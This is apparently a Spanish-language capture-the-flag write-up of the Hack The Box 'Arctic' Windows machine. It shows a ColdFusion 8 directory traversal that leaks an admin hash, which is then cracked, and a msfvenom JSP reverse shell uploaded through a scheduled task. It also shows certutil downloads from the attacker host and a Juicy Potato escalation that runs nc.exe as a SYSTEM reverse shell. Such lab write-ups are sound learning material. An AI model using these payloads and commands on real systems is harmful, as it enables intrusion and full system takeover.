---
title: Hack The Box Arctic
author: k4miyo
date: 2021-09-15
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows, Arbitrary File Upload, Patch Management]
ping: true
---

# Arctic
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.11.

```bash
❯ ping -c 1 10.10.10.11
PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=145 ms

--- 10.10.10.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 144.797/144.797/144.797/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-07 21:10 CDT
Initiating SYN Stealth Scan at 21:10
Scanning 10.10.10.11 [65535 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 49154/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 21:10, 26.58s elapsed (65535 total ports)
Nmap scan report for 10.10.10.11
Host is up, received user-set (0.15s latency).
Scanned at 2021-09-07 21:10:25 CDT for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.73 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 20 (880B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.11
   5   │     [*] Open ports: 135,8500,49154
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p135,8500,49154 10.10.10.11 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-07 21:12 CDT
Nmap scan report for 10.10.10.11
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.84 seconds
```

Obsevamos el puerto 8500/TCP abierto asociado al servicio *fmtp (Flight Message Transfer Protocol)* y es posible que observemos cierto contenido a través del sitio web; por lo que tratamos de ingresar a la URL `http://10.10.10.11:8500/` y observamos dos recursos de un listado de directorios:

![""](/assets/images/htb-arctic/arctic_web.png)

Explorando un poco los recursos vistos en el sitio web, observamos que en la siguiente dirección existe un panel de login asociado a la tecnología **Adobe Coldfusion 8**. Podriamos probar credenciales de acceso como: *admin:admin* o *admin:password*; sin embargo, no obtenemos acceso al portal, por lo que procedemos a buscar una posible vulnerabilidad asociada a dicha tecnología:

![""](/assets/images/htb-arctic/arctic_panel.png)

Buscando la existencia de algún exploit público, podemos encontrar multiples resultados con la herramienta `searchsploit`; por lo que le echamos un ojos poco a poco. Podemos empezar aquellos relacionados a *directory traversal - multiple/remote/14641.py*

```bash
❯ searchsploit adobe coldfusion 8
------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                   |  Path
------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                              | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                           | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                              | multiple/remote/16985.rb
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution      | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                    | multiple/webapps/45979.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass                                        | windows/webapps/27755.txt
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                  | multiple/webapps/40346.py
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting     | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scr | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scri | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

De acuerdo con el exploit, existe la posiblidad de acceso a la siguiente ruta: `http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`; ingresando, nos encontramos el panel de administración y el hash de la contraseña. Podriamos trata de identificar que tipo de hash se trata mediante el uso de la herramienta `hash-identifier`

![""](/assets/images/htb-arctic/arctic_pass.png)

```bash
❯ hash-identifier -h
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
                                
 Not Found.          
--------------------------------------------------
 HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
                                                                 
Possible Hashs:            
[+] SHA-1                                                        
[+] MySQL5 - SHA-1(SHA-1($pass))
```

Observamos que se trata de *SHA-1*, ahora podemos crackear el hash para obtener la contraseña en texto claro; podríamos realizarlo mediante diversas formas, en este caso lo haremos a través de `john` y mediante el sitio web [Crackstation](https://crackstation.net/).

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 SSE2 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)
1g 0:00:00:00 DONE (2021-09-07 21:53) 14.28g/s 73085p/s 73085c/s 73085C/s jodie..gabita
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

![""](/assets/images/htb-arctic/arctic_crack.png)

Ahora ingresamos al panel de administración de *Adobe Coldfusion* con el password identificado. Investigando un poco, podemos encontrar que existe una vulnerabilidad de dicha tecnología asociada al CVE *[CVE-2018-15961](https://www.cvedetails.com/cve/CVE-2018-15961/ "CVE-2018-15961 security vulnerability details")* que podemos explotar subiendo un archivo en **java** en la sección de *DEBUGGING & LOGGING → Scheduled Tasks* y llenamos los siguientes campos:

- Task Name: k4mishell
- URL: http://̣̣<ip_atacante>/k4mishell.jsp (también podría ser un archivo de extensión *cfm*)
- Publish: check
- File: C:\coldfusion8\wwwroot\CFIDE\k4mishell.jsp (Se intuye que la aplicación se encuentra montada en la ruta *C:\coldfusion8\wwwroot\\*, por lo que incluimos el directorio *CFIDE* y el nombre de nuestro archivo)

![""](/assets/images/htb-arctic/arctic_shell.png)

Por lo tanto, necesitamos generar nuestro archivo que nos entable la reverse shell, así como compartir un servidor HTTP con python.

```bash
❯ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.13 lport=443 -f raw -o k4mishell.jsp
Payload size: 1496 bytes
Saved as: k4mishell.jsp
```

Cuando se sube el archivo, ejecutamos la tarea para descargar el archivo desde nuestra máquina a la máquina víctima.

```bash
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [07/Sep/2021 22:36:44] "GET /k4mishell.jsp HTTP/1.1" 200 -
```

Nos dirigimos a la ruta `http://10.10.10.11:8500/CFIDE/` y observamos nuestro archivo. Ahora nos ponemos en escucha por el puerto 443 y ejecutamos nuestra reverse shell.

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.11] 49649
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
```

Ya estamos dentro de la máquina como el usuario *tolis* y podemos visualizar la flag *user.txt*. Ahora lo que falta es encontrar una manera de escalar privilegios en el sistema, por lo que procedemos a enumerar:

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Users\tolis\Desktop>
```

Observamos que se tiene habilitado el privilegio *SeImpersonatePrivilege*, por lo que podemos utilizar la herramienta *Juicy Potato*; por lo que descargarmos el ejecutable de algún recurso público [Github](https://github.com/ohpe/juicy-potato/releases/tag/v0.1), nos compartimos un servidor con python y lo transferimos a la máquina víctima; así como también el archivo *nc.exe*

```bash
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [07/Sep/2021 23:11:13] "GET /JuicyPotato.exe HTTP/1.1" 200 -
10.10.10.11 - - [07/Sep/2021 23:11:14] "GET /JuicyPotato.exe HTTP/1.1" 200 -
10.10.10.11 - - [07/Sep/2021 23:20:03] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.11 - - [07/Sep/2021 23:20:03] "GET /nc.exe HTTP/1.1" 200 -
```

```bash
cd C:\Windows\Temp\Privesc

certutil.exe -f -urlcache -split http://10.10.14.13/JuicyPotato.exe JP.exe
certutil.exe -f -urlcache -split http://10.10.14.13/JuicyPotato.exe JP.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\Privesc>

certutil.exe -f -urlcache -split http://10.10.14.13/nc.exe nc.exe
****  Online  ****
  0000  ...
  6e00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\Privesc>
```

Ahora nos ponemos en escucha a través del puerto 443 y ejecutamos el *Juicy Potato*:

```bash
JP.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd.exe 10.10.14.13 443" -t * -p C:\Windows\System32\cmd.exe -l 4444
JP.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd.exe 10.10.14.13 443" -t * -p C:\Windows\System32\cmd.exe -l 4444
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Windows\Temp\Privesc>
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.11] 49752
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\system32>
```

Ya somos administradores del sistema y podemos visualizar la flag *root.txt*.
